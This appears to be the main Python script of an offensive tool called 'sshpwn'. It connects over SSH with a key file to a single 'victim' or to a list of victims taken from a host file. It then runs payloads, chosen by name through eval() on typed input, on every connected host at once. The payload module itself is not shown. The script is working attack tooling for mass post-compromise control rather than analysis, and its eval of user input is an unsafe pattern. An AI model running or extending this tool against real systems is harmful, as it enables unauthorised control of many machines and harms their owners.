#!/usr/bin/python3

from pwn import *
import sys
import misc.coloredstatus as cs
from payloads.fun import *

def getvictimlist(configs):
    mode = input("\n" + cs.status + " Enter 's' for single-user mode, 'm' for multi-user mode: ")
    
    victims = []
    if mode == 's':
        RUSER = input(cs.status + " Enter remote user: ")
        RHOST = input(cs.status + " Enter remote host: ")
        try:
            victims.append(ssh(user=RUSER, host=RHOST, keyfile=configs["KeyFile"]))
            return victims, 0
        except:
            return None, 2
    elif mode == 'm':
        print(cs.status, "Using", configs["HostFileForMultiUser"], "file")
        victimlist = list(entry.strip().split(" ") for entry in open(configs["HostFileForMultiUser"], "r") if entry.strip())

        for victimentry in victimlist:
            try:
                victims.append(ssh(user=victimentry[0], host=victimentry[1], keyfile=configs["KeyFile"]))
            except:
                continue
        if len(victims) == 0:
            print(cs.error, "Unable to connect to anyone in", configs["HostFileForMultiUser"], "file")
            return None, 2

        print(cs.status, "Connected to", len(victims), "users")
        return victims, 0
    else:
        print(cs.error, "Unknown mode '" + mode + "'")
        return None, 2

def command(cmd):
    if cmd == "back":
        return 1
    elif cmd == "exit" or cmd == "quit":
        print(cs.status, "Exiting...")
        sys.exit(0)
    elif cmd == "help":
        print("back, exit, quit")
        return 2

def execute(cmd, victim, configs, params=None):
    try:
        result = eval(cmd + ".execute(victim, configs, params)")
    except NameError:
        print(cs.error, "Payload not found!")
        return 1

    if result == 0:
        print(cs.special, "Payload successful on", victim.host)
        return 0
    elif result == 1:
        return 1
    else:
        print(cs.error, "Payload failed on", victim.host)
        return 2

def main():
    print(cs.good, "Loaded payloads")

    configs = dict(config.strip().split(" ") for config in open("config", "r") if config.strip())
    print(cs.good, "Loaded config file")

    try:
        while True:
            victims, getvictimscode = getvictimlist(configs)
            if getvictimscode == 2:
                continue

            while True:
                sshpwncmd = input("\n" + cs.command + " sshpwn > ")
                sshpwntokens = sshpwncmd.split(" ", 1)

                commandcode = command(sshpwntokens[0])
                if commandcode == 1:
                    break
                elif commandcode == 2:
                    continue
            
                for victim in victims:
                    if len(sshpwntokens) == 1:
                        exitcode = execute(sshpwntokens[0], victim, configs)
                    else:
                        exitcode = execute(sshpwntokens[0], victim, configs, sshpwntokens[1])
                    if exitcode == 1:
                        break
                    elif exitcode == 2:
                        continue    

    except KeyboardInterrupt:
        print(cs.status, "Exiting...")

if __name__ == "__main__":
    main()
